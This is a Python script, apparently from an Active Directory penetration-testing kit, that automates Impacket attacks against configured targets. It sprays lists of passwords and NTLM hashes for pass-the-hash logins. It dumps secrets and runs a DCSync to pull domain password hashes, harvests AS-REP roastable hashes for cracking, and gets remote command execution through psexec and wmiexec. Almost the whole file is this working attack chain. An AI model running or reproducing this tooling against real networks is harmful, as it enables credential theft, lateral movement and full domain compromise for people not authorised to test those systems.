#!/usr/bin/env python3
import argparse
import os
import sys
import subprocess
import json
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple

from utils import Colors, Logger, execute_command, save_results

# Import shared configuration
try:
    from config import (
        TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES,
        IMPACKET_SETTINGS, LOG_DIRECTORY, RESULTS_DIRECTORY
    )
except ImportError:
    print("Error: config.py not found. Please ensure it exists in the current directory.")
    sys.exit(1)

class ImpacketToolkit:
    def __init__(self):
        self.log_dir = Path(LOG_DIRECTORY)
        self.results_dir = Path(RESULTS_DIRECTORY) / "impacket"
        
        # Create necessary directories
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        self.start_time = None
        self.end_time = None

         # Verify that required tools are available
        self.verify_impacket_tools()
        
    def verify_impacket_tools(self) -> bool:
        """Verify that all required Impacket tools are available"""
        required_tools = [
            "secretsdump.py",
            "smbclient.py",
            "psexec.py",
            "wmiexec.py",
            "GetNPUsers.py"
        ]
        
        Logger.section("Verifying Impacket Tools")
        all_tools_available = True
        
        for tool in required_tools:
            try:
                result = subprocess.run(f"which {tool}", shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    Logger.success(f"{tool} found at: {result.stdout.strip()}")
                else:
                    # Try with python -m
                    result = subprocess.run(f"python -m impacket.examples.{tool.replace('.py', '')}", 
                                        shell=True, capture_output=True, text=True)
                    if "usage" in result.stdout or "usage" in result.stderr:
                        Logger.success(f"{tool} available via Python module")
                    else:
                        Logger.error(f"{tool} not found")
                        all_tools_available = False
            except Exception as e:
                Logger.error(f"Error checking for {tool}: {str(e)}")
                all_tools_available = False
        
        if not all_tools_available:
            Logger.warning("Some Impacket tools are missing. Functionality will be limited.")
        
        return all_tools_available
        
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def save_results(self, target: str, output: str, tool: str) -> Path:
        """Save command results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('.', '_')}_{tool}_{timestamp}.txt"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def get_credentials(self) -> List[Tuple[str, str, str]]:
        """Generate a list of credential combinations to try"""
        credentials = []
        
        # Add username/password combinations
        for username in DOMAIN_USERS:
            for password in DOMAIN_PASSWORDS:
                credentials.append((username, password, None))
        
        # Add username/hash combinations
        for username in DOMAIN_USERS:
            for hash_value in NTLM_HASHES:
                credentials.append((username, None, hash_value))
        
        return credentials
    
    def get_domain_info(self, target: str) -> str:
        """Try to determine domain name from target"""
        dc_ip = target
        domain = IMPACKET_SETTINGS.get("domain", "WORKGROUP")
        
        # Try to get domain name if not specified in config
        if domain == "WORKGROUP":
            nslookup_cmd = f"nslookup {target} | grep 'Name:' | awk '{{print $2}}' | cut -d'.' -f2-"
            domain_output = self.execute_command(nslookup_cmd, "Determining domain name")
            if domain_output.strip():
                domain = domain_output.strip()
        
        return domain, dc_ip
    
    def run_secretsdump(self, target: str) -> Dict[str, Any]:
        """Run secretsdump.py against a target"""
        Logger.section(f"Running secretsdump against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        credentials = self.get_credentials()
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "username": None,
            "password": None,
            "hash": None,
            "hashes_obtained": 0,
            "output_file": None
        }
        
        for username, password, hash_value in credentials:
            Logger.subsection(f"Trying credentials: {username}")
            
            auth_option = ""
            if password:
                auth_option = f"{domain}/{username}:{password}"
            elif hash_value:
                auth_option = f"{domain}/{username} -hashes {hash_value}"
            
            command = f"secretsdump.py {auth_option} -dc-ip {dc_ip} {target}"
            output = self.execute_command(command, "Dumping secrets")
            
            # Check if the command was successful
            if "Administrator:500:" in output:
                results["success"] = True
                results["username"] = username
                results["password"] = password
                results["hash"] = hash_value
                results["hashes_obtained"] = output.count(":") - output.count("::")
                
                # Save results
                output_file = self.save_results(target, output, "secretsdump")
                results["output_file"] = str(output_file)
                
                Logger.success(f"Successfully dumped secrets from {target}")
                break
        
        if not results["success"]:
            Logger.error(f"Failed to dump secrets from {target}")
        
        return results
    
    def run_smbclient(self, target: str) -> Dict[str, Any]:
        """Use smbclient.py to list and access shares"""
        Logger.section(f"Running smbclient against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        credentials = self.get_credentials()
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "username": None,
            "password": None,
            "hash": None,
            "shares": [],
            "output_file": None
        }
        
        for username, password, hash_value in credentials:
            Logger.subsection(f"Trying credentials: {username}")
            
            auth_option = ""
            if password:
                auth_option = f"{domain}/{username}:{password}"
            elif hash_value:
                auth_option = f"{domain}/{username} -hashes {hash_value}"
            
            command = f"smbclient.py {auth_option} -dc-ip {dc_ip} {target}"
            output = self.execute_command(command, "Listing shares")
            
            # Check if the command was successful
            if "Disk" in output or "IPC" in output:
                results["success"] = True
                results["username"] = username
                results["password"] = password
                results["hash"] = hash_value
                
                # Parse shares
                for line in output.splitlines():
                    if "Disk" in line:
                        share_name = line.split()[0].strip()
                        results["shares"].append(share_name)
                
                # Save results
                output_file = self.save_results(target, output, "smbclient")
                results["output_file"] = str(output_file)
                
                Logger.success(f"Successfully listed shares on {target}")
                break
        
        if not results["success"]:
            Logger.error(f"Failed to list shares on {target}")
        
        return results
    
    def run_psexec(self, target: str) -> Dict[str, Any]:
        """Use psexec.py to get command execution"""
        Logger.section(f"Running psexec against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        credentials = self.get_credentials()
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "username": None,
            "password": None,
            "hash": None,
            "output_file": None
        }
        
        for username, password, hash_value in credentials:
            Logger.subsection(f"Trying credentials: {username}")
            
            auth_option = ""
            if password:
                auth_option = f"{domain}/{username}:{password}"
            elif hash_value:
                auth_option = f"{domain}/{username} -hashes {hash_value}"
            
            # Use a basic command to check access
            command = f"psexec.py {auth_option} -dc-ip {dc_ip} {target} whoami"
            output = self.execute_command(command, "Executing remote command")
            
            # Check if the command was successful
            if "\\" in output and not "[-]" in output:
                results["success"] = True
                results["username"] = username
                results["password"] = password
                results["hash"] = hash_value
                
                # Save results
                output_file = self.save_results(target, output, "psexec")
                results["output_file"] = str(output_file)
                
                Logger.success(f"Successfully executed commands on {target}")
                break
        
        if not results["success"]:
            Logger.error(f"Failed to execute commands on {target}")
        
        return results
    
    def run_wmiexec(self, target: str) -> Dict[str, Any]:
        """Use wmiexec.py to get command execution"""
        Logger.section(f"Running wmiexec against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        credentials = self.get_credentials()
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "username": None,
            "password": None,
            "hash": None,
            "output_file": None
        }
        
        for username, password, hash_value in credentials:
            Logger.subsection(f"Trying credentials: {username}")
            
            auth_option = ""
            if password:
                auth_option = f"{domain}/{username}:{password}"
            elif hash_value:
                auth_option = f"{domain}/{username} -hashes {hash_value}"
            
            # Use a basic command to check access
            command = f"wmiexec.py {auth_option} -dc-ip {dc_ip} {target} whoami"
            output = self.execute_command(command, "Executing remote command via WMI")
            
            # Check if the command was successful
            if "\\" in output and not "[-]" in output:
                results["success"] = True
                results["username"] = username
                results["password"] = password
                results["hash"] = hash_value
                
                # Save results
                output_file = self.save_results(target, output, "wmiexec")
                results["output_file"] = str(output_file)
                
                Logger.success(f"Successfully executed WMI commands on {target}")
                break
        
        if not results["success"]:
            Logger.error(f"Failed to execute WMI commands on {target}")
        
        return results
    
    def run_asreproast(self, target: str) -> Dict[str, Any]:
        """Run ASREPRoast attack using GetNPUsers.py"""
        Logger.section(f"Running ASREPRoast against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "users_without_preauth": 0,
            "output_file": None
        }
        
        # Try to get all users without preauthentication
        command = f"GetNPUsers.py {domain}/ -dc-ip {dc_ip} -request -format hashcat -outputfile {self.results_dir}/asreproast_{target.replace('.', '_')}.txt"
        output = self.execute_command(command, "Getting users without pre-authentication")
        
        # Check if any users were found
        if "got TGT" in output:
            results["success"] = True
            results["users_without_preauth"] = output.count("got TGT")
            
            # Save results
            output_file = self.save_results(target, output, "asreproast")
            results["output_file"] = str(output_file)
            
            Logger.success(f"Successfully found {results['users_without_preauth']} users without pre-authentication")
        else:
            Logger.error("No users without pre-authentication found")
        
        return results
    
    def run_dcsync(self, target: str) -> Dict[str, Any]:
        """Run DCSync attack using secretsdump.py"""
        Logger.section(f"Running DCSync against {target}")
        
        domain, dc_ip = self.get_domain_info(target)
        credentials = self.get_credentials()
        
        results = {
            "target": target,
            "success": False,
            "domain": domain,
            "username": None,
            "password": None,
            "hash": None,
            "accounts_synced": 0,
            "output_file": None
        }
        
        for username, password, hash_value in credentials:
            Logger.subsection(f"Trying credentials: {username}")
            
            auth_option = ""
            if password:
                auth_option = f"{domain}/{username}:{password}"
            elif hash_value:
                auth_option = f"{domain}/{username} -hashes {hash_value}"
            
            # Try DCSync attack
            command = f"secretsdump.py {auth_option} -dc-ip {dc_ip} {domain}/ -just-dc"
            output = self.execute_command(command, "Performing DCSync attack")
            
            # Check if the attack was successful
            if "Administrator:500:" in output:
                results["success"] = True
                results["username"] = username
                results["password"] = password
                results["hash"] = hash_value
                results["accounts_synced"] = output.count(":") - output.count("::")
                
                # Save results
                output_file = self.save_results(target, output, "dcsync")
                results["output_file"] = str(output_file)
                
                Logger.success(f"Successfully performed DCSync attack against {target}")
                break
        
        if not results["success"]:
            Logger.error(f"Failed to perform DCSync attack against {target}")
        
        return results
    
    def run_all_tools(self, targets: List[str]) -> Dict[str, Any]:
        """Run all Impacket tools against the specified targets"""
        self.start_time = datetime.now()
        Logger.section("Starting Impacket Tools Suite")
        Logger.info(f"Start Time: {self.start_time}")
        
        all_results = {
            "start_time": str(self.start_time),
            "targets": targets,
            "secretsdump_results": [],
            "smbclient_results": [],
            "psexec_results": [],
            "wmiexec_results": [],
            "asreproast_results": [],
            "dcsync_results": []
        }
        
        for target in targets:
            Logger.section(f"Target: {target}")
            
            # Run all tools against the target
            asreproast_result = self.run_asreproast(target)
            all_results["asreproast_results"].append(asreproast_result)
            
            smbclient_result = self.run_smbclient(target)
            all_results["smbclient_results"].append(smbclient_result)
            
            if smbclient_result["success"]:
                # If SMB access was successful, try more aggressive tools
                secretsdump_result = self.run_secretsdump(target)
                all_results["secretsdump_results"].append(secretsdump_result)
                
                psexec_result = self.run_psexec(target)
                all_results["psexec_results"].append(psexec_result)
                
                wmiexec_result = self.run_wmiexec(target)
                all_results["wmiexec_results"].append(wmiexec_result)
                
                dcsync_result = self.run_dcsync(target)
                all_results["dcsync_results"].append(dcsync_result)
        
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        all_results["end_time"] = str(self.end_time)
        all_results["duration"] = str(duration)
        
        Logger.section("Impacket Tools Completed")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        
        # Save overall results
        summary_file = self.results_dir / f"impacket_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(all_results, f, indent=4)
        
        Logger.success(f"Summary saved to {summary_file}")
        
        return all_results

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}Impacket Toolkit for AD Pentesting{Colors.ENDC}')
    parser.add_argument('command', choices=['secretsdump', 'smbclient', 'psexec', 'wmiexec', 'asreproast', 'dcsync', 'all'], 
                        help='Impacket tool to run')
    parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames')
    
    args = parser.parse_args()
    
    toolkit = ImpacketToolkit()
    targets = args.targets or TARGETS
    
    if not targets:
        Logger.error("No targets specified. Add targets to config.py or provide them as arguments.")
        return
    
    if args.command == 'secretsdump':
        for target in targets:
            toolkit.run_secretsdump(target)
    elif args.command == 'smbclient':
        for target in targets:
            toolkit.run_smbclient(target)
    elif args.command == 'psexec':
        for target in targets:
            toolkit.run_psexec(target)
    elif args.command == 'wmiexec':
        for target in targets:
            toolkit.run_wmiexec(target)
    elif args.command == 'asreproast':
        for target in targets:
            toolkit.run_asreproast(target)
    elif args.command == 'dcsync':
        for target in targets:
            toolkit.run_dcsync(target)
    elif args.command == 'all':
        toolkit.run_all_tools(targets)

if __name__ == "__main__":
    main()